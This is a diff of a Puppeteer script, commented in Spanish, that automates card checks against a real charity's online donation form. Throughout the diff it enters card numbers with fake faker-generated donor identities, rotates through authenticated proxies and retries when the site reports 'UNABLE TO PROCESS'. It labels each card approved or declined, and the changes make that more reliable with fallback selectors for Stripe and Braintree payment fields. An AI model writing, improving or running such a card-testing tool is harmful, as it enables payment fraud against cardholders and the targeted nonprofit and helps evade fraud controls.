@@ -13,6 +13,7 @@ const PROXY_STRING = process.env.PROXY_STRING || '';
 const TARGET_URL = process.env.TARGET_URL || 'https://braveacademy.org/give-now-aca';
 const HEADLESS = process.env.HEADLESS === 'false' ? false : 
                  process.env.HEADLESS === 'new' ? 'new' : true;
+
 let browser = null;
 let page = null;
 
@@ -44,33 +45,29 @@ async function getNewPage() {
         '--disable-gpu',
         '--disable-software-rasterizer'
     ];
+    let proxyUrl = null;
     if (proxyData) {
-        args.push(`--proxy-server=${proxyData.host}:${proxyData.port}`);
+        proxyUrl = `http://${proxyData.username}:${proxyData.password}@${proxyData.host}:${proxyData.port}`;
+        args.push(`--proxy-server=${proxyUrl}`);
+        console.log(`🔐 Proxy configurado: ${proxyData.host}:${proxyData.port}`);
     }
 
-    // Asegurar que el modo headless se pase correctamente
     const launchOptions = {
         headless: HEADLESS,
         args: args,
-        ignoreHTTPSErrors: true
+        ignoreHTTPSErrors: true,
+        timeout: 60000
     };
-
-    // Si HEADLESS es 'new', no necesitamos --headless flag, pero añadimos para seguridad
-    if (HEADLESS === 'new') {
-        args.push('--headless=new');
-    }
 
     try {
         browser = await puppeteer.launch(launchOptions);
     } catch (error) {
         console.error('❌ Error al lanzar Chromium:', error.message);
-        console.error('Args:', args);
         throw error;
     }
 
     page = await browser.newPage();
-
-    if (proxyData) {
+    if (proxyData && !proxyUrl) {
         await page.authenticate({
             username: proxyData.username,
             password: proxyData.password
@@ -80,37 +77,34 @@ async function getNewPage() {
     await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
     return page;
 }
-// ---------- Generar dirección (fijando estado CO) ----------
+
+// ---------- Generar dirección ----------
 function generarDireccion() {
     const firstName = faker.person.firstName();
     const lastName = faker.person.lastName();
-    const fullName = `${firstName} ${lastName}`;
     const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${faker.number.int({ min: 10, max: 99 })}@gmail.com`;
     const street = faker.location.streetAddress();
     const city = faker.location.city();
-    const state = 'CO'; // Fijo para simplificar
+    const state = 'CO';
     const zip = faker.location.zipCode('#####');
-    return {
-        firstName,
-        lastName,
-        fullName,
-        email,
-        street,
-        city,
-        state,
-        zip
-    };
+    return { firstName, lastName, email, street, city, state, zip };
 }
 
-// ---------- Esperar selector con timeout ----------
-async function waitForSelector(page, selector, timeout = 30000) {
-    try {
-        await page.waitForSelector(selector, { timeout, visible: true });
-        return true;
-    } catch (e) {
-        console.log(`Selector no encontrado: ${selector}`);
-        return false;
+// ---------- Esperar selector con reintentos ----------
+async function waitForSelectorWithRetry(page, selectors, timeout = 60000, retries = 3) {
+    const combined = Array.isArray(selectors) ? selectors.join(', ') : selectors;
+    for (let attempt = 1; attempt <= retries; attempt++) {
+        try {
+            console.log(`🔍 Intentando selector: ${combined} (intento ${attempt}/${retries})`);
+            const element = await page.waitForSelector(combined, { timeout: timeout / retries, visible: true });
+            if (element) return element;
+        } catch (e) {
+            console.log(`❌ Selector no encontrado: ${combined}`);
+            if (attempt === retries) return null;
+            await page.waitForTimeout(1000);
+        }
     }
+    return null;
 }
 
 // ---------- Función principal de verificación ----------
@@ -129,194 +123,213 @@ async function verificarTarjeta(cardData, amount) {
             const page = await getNewPage();
             console.log(`🔍 Navegando a ${TARGET_URL}... (intento ${intentos+1})`);
 
-            // 1. Ir a la página
             await page.goto(TARGET_URL, {
-                waitUntil: 'networkidle2',
+                waitUntil: 'networkidle0',
                 timeout: 60000,
                 ignoreHTTPSErrors: true
             });
 
-            // Esperar un poco para que el DOM cargue completamente
-            await page.waitForTimeout(2000);
+            // Esperar 2 segundos para que el DOM se estabilice
+            await page.waitForTimeout(3000);
 
-            // 2. Llenar monto - usar data-cy (más estable que el ID dinámico)
-            const montoSelector = 'input[data-cy="gift-amount-input-0"]';
-            // Esperar hasta 30 segundos a que aparezca
-            if (await waitForSelector(page, montoSelector, 30000)) {
-                await page.click(montoSelector, { clickCount: 3 });
-                await page.type(montoSelector, amount);
+            // ---- 1. Campo de monto ----
+            const montoSelectors = [
+                'input[data-cy="gift-amount-input-0"]',
+                'input[placeholder="0.00"]',
+                'input[type="text"][inputmode="decimal"]'
+            ];
+            const montoElement = await waitForSelectorWithRetry(page, montoSelectors, 30000, 3);
+            if (!montoElement) {
+                throw new Error('No se encontró el campo de monto');
+            }
+            await page.click(montoSelectors.join(', '), { clickCount: 3 });
+            await page.type(montoSelectors.join(', '), amount);
+
+            // ---- 2. Botón "Card" ----
+            const cardBtnSelectors = [
+                '[data-cy="payment-type-card-btn"]',
+                'div[data-cy="payment-type-card-btn"]',
+                'button:has-text("Card")',
+                'div:has-text("Card")'
+            ];
+            // Usar waitForSelector con texto
+            const cardBtn = await page.waitForSelector('text/Card', { timeout: 15000 }).catch(() => null);
+            if (cardBtn) {
+                await cardBtn.click();
             } else {
-                // Fallback: buscar por placeholder
-                const fallback = 'input[placeholder="0.00"]';
-                if (await waitForSelector(page, fallback, 5000)) {
-                    await page.click(fallback, { clickCount: 3 });
-                    await page.type(fallback, amount);
+                // Intentar con data-cy
+                const cardBtn2 = await page.waitForSelector('[data-cy="payment-type-card-btn"]', { timeout: 5000 }).catch(() => null);
+                if (cardBtn2) {
+                    await cardBtn2.click();
                 } else {
-                    throw new Error('No se encontró el campo de monto');
+                    console.log('⚠️ No se encontró botón "Card", quizás ya está seleccionado');
                 }
             }
 
-            // 3. Seleccionar método de pago "Card" si no está activo
-            const cardBtn = '[data-cy="payment-type-card-btn"]';
-            if (await waitForSelector(page, cardBtn)) {
-                const isActive = await page.$eval(cardBtn, el => el.classList.contains('active'));
-                if (!isActive) {
-                    await page.click(cardBtn);
-                }
-            } else {
-                // Intentar por texto
-                await page.click('text=Card').catch(() => {});
-            }
+            // Esperar a que aparezca el iframe de pago
+            await page.waitForTimeout(3000);
 
-            // Esperar que aparezcan los campos de tarjeta (pueden estar en iframe)
-            // Buscar en todos los frames
-            const frames = page.frames();
+            // ---- 3. Encontrar el iframe ----
             let cardFrame = null;
+            const frames = page.frames();
             for (const f of frames) {
                 try {
-                    if (await f.$('input.cc-input') || await f.$('input[placeholder*="Card Number"]')) {
+                    const hasInput = await f.evaluate(() => {
+                        return document.querySelector('input.cc-input') !== null ||
+                               document.querySelector('input[placeholder*="Card Number"]') !== null ||
+                               document.querySelector('input[data-elements-stable-field-name="cardNumber"]') !== null;
+                    });
+                    if (hasInput) {
                         cardFrame = f;
                         break;
                     }
                 } catch (e) {}
             }
+            if (!cardFrame) {
+                // Buscar por nombre de frame común de Stripe
+                for (const f of frames) {
+                    const url = f.url();
+                    if (url.includes('stripe') || url.includes('braintree') || url.includes('payment')) {
+                        cardFrame = f;
+                        break;
+                    }
+                }
+            }
             const target = cardFrame || page;
+            console.log(`📦 Frame de pago: ${cardFrame ? 'encontrado' : 'no encontrado, usando página principal'}`);
 
-            // 4. Rellenar número de tarjeta
-            const numSel = 'input.cc-input, input[placeholder*="Card Number"]';
-            if (await waitForSelector(target, numSel, 10000)) {
-                await target.click(numSel);
-                await target.type(numSel, numero);
-            } else {
+            // ---- 4. Número de tarjeta ----
+            const numSelectors = [
+                'input.cc-input',
+                'input[placeholder*="Card Number"]',
+                'input[data-elements-stable-field-name="cardNumber"]',
+                'input[name="cardnumber"]',
+                'input[autocomplete="cc-number"]'
+            ];
+            const numElement = await waitForSelectorWithRetry(target, numSelectors, 15000, 3);
+            if (!numElement) {
+                // Capturar screenshot para depuración
+                const screenshot = await page.screenshot({ encoding: 'base64', fullPage: true });
+                console.log('🖼️ Screenshot (base64):', screenshot.slice(0, 100) + '...');
                 throw new Error('No se encontró el campo de número de tarjeta');
             }
+            await target.click(numSelectors.join(', '));
+            await target.type(numSelectors.join(', '), numero);
 
-            // 5. Fecha de expiración
-            const expSel = 'input.exp-input, input[placeholder*="MM/YY"]';
-            if (await waitForSelector(target, expSel, 5000)) {
-                await target.click(expSel);
-                await target.type(expSel, expira);
-            } else {
-                throw new Error('No se encontró el campo de fecha');
-            }
+            // ---- 5. Fecha expiración ----
+            const expSelectors = [
+                'input.exp-input',
+                'input[placeholder*="MM/YY"]',
+                'input[data-elements-stable-field-name="cardExpiry"]',
+                'input[name="expiry"]',
+                'input[autocomplete="cc-exp"]'
+            ];
+            const expElement = await waitForSelectorWithRetry(target, expSelectors, 10000, 3);
+            if (!expElement) throw new Error('No se encontró el campo de fecha');
+            await target.click(expSelectors.join(', '));
+            await target.type(expSelectors.join(', '), expira);
 
-            // 6. CVV
-            const cvvSel = 'input.cvv-input, input[placeholder*="CVV"]';
-            if (await waitForSelector(target, cvvSel, 5000)) {
-                await target.click(cvvSel);
-                await target.type(cvvSel, cvv);
-            } else {
-                throw new Error('No se encontró el campo CVV');
-            }
+            // ---- 6. CVV ----
+            const cvvSelectors = [
+                'input.cvv-input',
+                'input[placeholder*="CVV"]',
+                'input[data-elements-stable-field-name="cardCvc"]',
+                'input[name="cvv"]',
+                'input[autocomplete="cc-csc"]'
+            ];
+            const cvvElement = await waitForSelectorWithRetry(target, cvvSelectors, 10000, 3);
+            if (!cvvElement) throw new Error('No se encontró el campo CVV');
+            await target.click(cvvSelectors.join(', '));
+            await target.type(cvvSelectors.join(', '), cvv);
 
-            // 7. Rellenar datos personales y dirección (en la página principal, fuera del iframe)
-            // Nombre
+            // ---- 7. Datos personales (fuera del iframe) ----
             const firstNameSel = '#rock-textbox-a991fa77-baf9-451f-a367-00f5ec7ca436, input[data-cy="person-firstname-input"]';
-            if (await waitForSelector(page, firstNameSel)) {
+            if (await page.waitForSelector(firstNameSel, { timeout: 10000 }).catch(() => false)) {
                 await page.click(firstNameSel);
                 await page.type(firstNameSel, direccion.firstName);
             } else {
-                throw new Error('No se encontró el campo First Name');
+                console.log('⚠️ No se encontró campo First Name');
             }
 
             const lastNameSel = '#rock-textbox-a3d9aba8-9287-478a-8b6c-469967e3982a, input[data-cy="person-lastname-input"]';
-            if (await waitForSelector(page, lastNameSel)) {
+            if (await page.waitForSelector(lastNameSel, { timeout: 5000 }).catch(() => false)) {
                 await page.click(lastNameSel);
                 await page.type(lastNameSel, direccion.lastName);
-            } else {
-                throw new Error('No se encontró el campo Last Name');
             }
 
             const emailSel = '#rock-textbox-dd894906-0601-42c5-8d15-f847e289e6aa, input[data-cy="person-email-input"]';
-            if (await waitForSelector(page, emailSel)) {
+            if (await page.waitForSelector(emailSel, { timeout: 5000 }).catch(() => false)) {
                 await page.click(emailSel);
                 await page.type(emailSel, direccion.email);
-            } else {
-                throw new Error('No se encontró el campo Email');
             }
 
             const addressSel = '#rock-textbox-4a7d37af-6794-4414-98e5-81ca82d01c29, input[autocomplete="address-line1"]';
-            if (await waitForSelector(page, addressSel)) {
+            if (await page.waitForSelector(addressSel, { timeout: 5000 }).catch(() => false)) {
                 await page.click(addressSel);
                 await page.type(addressSel, direccion.street);
-            } else {
-                throw new Error('No se encontró el campo Address Line 1');
             }
 
-            // Address Line 2 lo dejamos vacío (no es obligatorio)
             // City
             const citySel = '#rock-textbox-2caf2e9a-8672-4e5d-aa73-1eb6d61827c2, input[autocomplete="address-level2"]';
-            if (await waitForSelector(page, citySel)) {
+            if (await page.waitForSelector(citySel, { timeout: 5000 }).catch(() => false)) {
                 await page.click(citySel);
                 await page.type(citySel, direccion.city);
-            } else {
-                throw new Error('No se encontró el campo City');
             }
 
-            // Estado: seleccionar CO del dropdown
-            // El dropdown tiene un input oculto y un span con el valor seleccionado
-            // Vamos a hacer clic en el selector para abrir el dropdown, luego buscar la opción CO
-            // Primero identificar el contenedor del dropdown
-            const stateDropdown = '.ant-select-selector'; // selector del contenedor
-            if (await waitForSelector(page, stateDropdown)) {
-                // Hacer clic para abrir
-                await page.click(stateDropdown);
-                // Esperar que aparezca la lista de opciones
-                await page.waitForSelector('.ant-select-item-option', { timeout: 5000 });
-                // Hacer clic en la opción que contenga "CO" (exacto)
-                const option = await page.$('.ant-select-item-option[title="CO"]');
-                if (option) {
-                    await option.click();
+            // State dropdown
+            const stateDropdownSel = '.ant-select-selector';
+            if (await page.waitForSelector(stateDropdownSel, { timeout: 5000 }).catch(() => false)) {
+                await page.click(stateDropdownSel);
+                await page.waitForTimeout(1000);
+                const stateOption = await page.waitForSelector('.ant-select-item-option[title="CO"]', { timeout: 5000 }).catch(() => null);
+                if (stateOption) {
+                    await stateOption.click();
                 } else {
-                    // Buscar por texto
-                    await page.click('.ant-select-item-option:has-text("CO")');
+                    // Intentar con texto
+                    await page.click('.ant-select-item-option:has-text("CO")').catch(() => {});
                 }
-            } else {
-                throw new Error('No se encontró el dropdown de estado');
             }
 
             // Zip
             const zipSel = '#rock-textbox-033d95e6-f607-49c6-a191-f9ba42875daf, input[autocomplete="postal-code"]';
-            if (await waitForSelector(page, zipSel)) {
+            if (await page.waitForSelector(zipSel, { timeout: 5000 }).catch(() => false)) {
                 await page.click(zipSel);
                 await page.type(zipSel, direccion.zip);
-            } else {
-                throw new Error('No se encontró el campo Zip');
             }
 
-            // 8. Hacer clic en "Review Details"
-            const reviewBtn = '[data-cy="payment-save-btn"]';
-            if (await waitForSelector(page, reviewBtn)) {
-                await page.click(reviewBtn);
-                await page.waitForTimeout(2000);
+            // ---- 8. Botón Review Details ----
+            const reviewBtn = await page.waitForSelector('[data-cy="payment-save-btn"]', { timeout: 15000 }).catch(() => null);
+            if (reviewBtn) {
+                await reviewBtn.click();
+                await page.waitForTimeout(3000);
             } else {
                 throw new Error('No se encontró el botón Review Details');
             }
 
-            // 9. Verificar si aparece "UNABLE TO PROCESS"
-            const unableText = await page.evaluate(() => document.body.innerText.includes('UNABLE TO PROCESS'));
-            if (unableText) {
+            // ---- 9. Verificar "UNABLE TO PROCESS" ----
+            const bodyText = await page.evaluate(() => document.body.innerText);
+            if (bodyText.includes('UNABLE TO PROCESS')) {
                 console.log('⚠️ UNABLE TO PROCESS detectado, reintentando...');
                 intentos++;
                 ultimoError = 'UNABLE TO PROCESS';
-                continue; // reintentar con nueva página (proxy)
+                continue;
             }
 
-            // 10. Hacer clic en "Give $X.XX"
-            const giveBtn = '[data-cy="review-submit-btn"]';
-            if (await waitForSelector(page, giveBtn)) {
-                await page.click(giveBtn);
-                await page.waitForTimeout(3000);
+            // ---- 10. Botón Give $X.XX ----
+            const giveBtn = await page.waitForSelector('[data-cy="review-submit-btn"]', { timeout: 15000 }).catch(() => null);
+            if (giveBtn) {
+                await giveBtn.click();
+                await page.waitForTimeout(5000);
             } else {
                 throw new Error('No se encontró el botón de envío');
             }
 
-            // 11. Evaluar resultado final
-            const bodyText = await page.evaluate(() => document.body.innerText);
-            if (bodyText.includes('Thank You')) {
+            // ---- 11. Resultado final ----
+            const finalText = await page.evaluate(() => document.body.innerText);
+            if (finalText.includes('Thank You')) {
                 const screenshot = await page.screenshot({ encoding: 'base64', fullPage: true });
                 return { resultado: 'approved', mensaje: 'Donación exitosa', screenshot };
-            } else if (bodyText.includes('GIFT FAILED') || bodyText.includes('Please verify your payment information')) {
+            } else if (finalText.includes('GIFT FAILED') || finalText.includes('Please verify your payment information')) {
                 return { resultado: 'declined', mensaje: 'GIFT FAILED - Verifique datos' };
             } else {
                 return { resultado: 'error', mensaje: 'Respuesta desconocida' };
